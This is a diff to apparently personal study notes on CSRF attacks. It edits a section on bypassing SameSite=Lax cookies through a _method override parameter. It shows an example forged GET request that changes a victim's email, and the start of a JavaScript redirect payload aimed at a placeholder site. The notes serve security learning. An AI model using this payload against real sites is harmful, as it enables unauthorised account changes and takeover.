@@ -144,11 +144,11 @@ To exploit a CSRF token + cookie mechanism, two actions are required:
 ### Lax Bypass Via Method Override
 
 1. **Change request method from POST to GET in Burp**
-2. **Try overriding the method by adding the ```_method``` parameter to the query string**
+2. **Try overriding the method by adding the ```_method``` parameter to the query string. `[HTML forms don't support the PUT, PATCH, or DELETE methods. However, some frameworks provide a _method field to simulate these methods.]`**
 
 **Example**: GET /my-account/change-email?email=pwned@hacked.com```&_method=POST``` HTTP/1.1
 
-**Payload**
+**Payload Or, we can use burp csrf poc generator.**
 ```javascript
 <script>
     document.location = "https://vulnerable.web/my-account/change-email?email=pwned@hacked.com&_method=POST";
